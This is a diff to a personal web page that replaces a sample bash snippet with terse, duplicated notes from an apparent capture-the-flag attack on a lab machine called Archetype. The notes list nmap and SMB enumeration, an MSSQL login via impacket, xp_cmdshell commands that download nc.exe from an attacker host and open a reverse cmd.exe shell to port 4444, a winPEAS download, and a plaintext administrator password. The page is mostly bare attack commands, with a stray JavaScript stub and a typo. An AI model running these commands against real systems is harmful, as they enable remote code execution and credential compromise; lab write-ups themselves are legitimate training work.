@@ -61,24 +61,105 @@ https://www.tooplate.com/view/2124-vertex
                             
                             <pre class="align-center">
                                 <code class="language-bash">
-                                    echo "Números aleatorios:"
-                                    for ((i=1; i<=5; i++)); do
-                                        random_number=$((RANDOM % 100 + 1)) # Genera un número aleatorio entre 1 y 100
-                                        echo "$i: $random_number"
-                                    done
+                                    function name() {
+                                        console.log("output")
+                                      }
+nmap -p 1-10000 -sV 10.129.95.187
+smbclient -L 10.129.95.187
+smbclient //10.129.95.187/(nombre de grupo)backups
+get prod.dtsConfig
+cat prod.dtsConfig
+/usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 - windows-auth
+-
+sudo python -m http.server 80 = activar servidor http
+nc -lvnp 4444= activar netcat con el puerto respectivo y especificando
+-
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget  http://10.10.14.173/nc.exe -outfile nc.exe" 
+
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nv.exe -e cmd.exe 10.10.14.173 4444"
+wget http://10.10.14.173/winPEASx64.exe -outfile winpeas.exe
+administrator MEGACORP_4dm1n!!
+
+                             
                                 </code>
                             </pre>
+                            <pre class="align-center">
+                                <code class="language-bash">
+                                    function name() {
+                                        console.log("output")
+                                      }
+nmap -p 1-10000 -sV 10.129.95.187
+smbclient -L 10.129.95.187
+smbclient //10.129.95.187/(nombre de grupo)backups
+get prod.dtsConfig
+cat prod.dtsConfig
+/usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 - windows-auth
+-
+sudo python -m http.server 80 = activar servidor http
+nc -lvnp 4444= activar netcat con el puerto respectivo y especificando
+-
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget  http://10.10.14.173/nc.exe -outfile nc.exe" 
+
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nv.exe -e cmd.exe 10.10.14.173 4444"
+wget http://10.10.14.173/winPEASx64.exe -outfile winpeas.exe
+administrator MEGACORP_4dm1n!!
+
+                             
+                                </code>
+                            </pre>
+
                         </p>
-                        <span class="tm-text-secondary tm-media-span tm-text-small">
-                            Friday . 25 June 2021
-                        </span>
                         <hr class="tm-hr tm-mr">
                     </div>
                 </div> 
+                <img class="align-center" src="../img/captures/ARCHETYPE1.png" width="1150" height="300">
             </div>             
 </body>
  <script src="https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/languages/go.min.js"></script>
 
 <script>hljs.highlightAll();</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>
+ 
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs-themes@1.0.0/androidstudio.css" />
+
+<script>
+    hljs.highlightAll(); // initialize highlighting
+</script>
+
+<!-- Code to append a click to copy button -->
+<script>
+    var snippets = document.getElementsByTagName('pre');
+    var numberOfSnippets = snippets.length;
+    for (var i = 0; i < numberOfSnippets; i++) {
+        code = snippets[i].getElementsByTagName('code')[0].innerText;
+
+        snippets[i].classList.add('hljs'); // append copy button to pre tag
+
+        snippets[i].innerHTML = '<button class="hljs-copy">Copy</button>' + snippets[i].innerHTML; // append copy button
+
+        snippets[i].getElementsByClassName('hljs-copy')[0].addEventListener("click", function () {
+            this.innerText = 'Copying..';
+            if (!navigator.userAgent.toLowerCase().includes('safari')) {
+                navigator.clipboard.writeText(code);
+            } else {
+                prompt("Clipboard (Select: ⌘+a > Copy:⌘+c)", code);
+            }
+            this.innerText = 'Copied!';
+            button = this;
+            setTimeout(function () {
+                button.innerText = 'Copy';
+            }, 1000)
+        });
+    }
+</script>
+<style>
+    .hljs-copy {
+        float: right;
+        cursor: pointer;
+    }
+</style>
+
+<!-- Code to append a click to copy button -->
+
 </html>
